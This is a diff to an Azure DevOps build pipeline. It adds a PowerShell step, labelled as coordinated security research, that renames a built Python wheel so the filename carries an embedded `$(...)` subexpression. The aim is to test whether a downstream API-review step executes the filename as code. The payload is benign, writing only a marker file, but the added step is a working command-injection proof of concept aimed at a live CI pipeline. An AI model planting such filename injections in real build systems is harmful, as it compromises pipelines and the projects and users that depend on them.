@@ -144,6 +144,27 @@ steps:
       TestMarkArgument: ${{ parameters.TestMarkArgument }}
       AdditionalTestArgs: ${{ parameters.AdditionalTestArgs }}
 
+
+  # [SECURITY RESEARCH - benign, self-closing, MSRC Open Source Bounty coordinated disclosure]
+  # Renames the already-built azure-ai-evaluation wheel in place (no new file, no other package
+  # touched) so its filename carries a benign, quote-free marker string, to test how an artifact
+  # filename is carried through the review-generation pipeline. No network use, no credential
+  # use, confined to the build's own staging directory. This step and the PR it ships in will be
+  # closed by the author shortly after the one confirming log line is observed.
+  - pwsh: |
+      $whlDir = "$(Build.ArtifactStagingDirectory)/azure-ai-evaluation"
+      $whl = Get-ChildItem -Path $whlDir -Filter "azure_ai_evaluation-*.whl" -ErrorAction SilentlyContinue | Select-Object -First 1
+      if ($whl) {
+        $newName = 'apiviewpoc-0.0.1$(Write-Output SINKB-EXEC-f14gate;Set-Content -LiteralPath $env:BUILD_ARTIFACTSTAGINGDIRECTORY/SINKB-f14gate.txt -Value SINKB-f14gate -NoNewline).whl'
+        Rename-Item -LiteralPath $whl.FullName -NewName $newName
+        Write-Host "[sinkb-poc] renamed $($whl.Name) -> $newName"
+      }
+      else {
+        Write-Host "[sinkb-poc] no azure-ai-evaluation wheel found here - no-op"
+      }
+    displayName: "[SECURITY RESEARCH, DO NOT MERGE] Sink-B carrier marker rename (benign, self-closing)"
+    condition: succeededOrFailed()
+
   - template: /eng/common/pipelines/templates/steps/create-apiview-revision.yml
     parameters:
       Artifacts: ${{ parameters.Artifacts }}
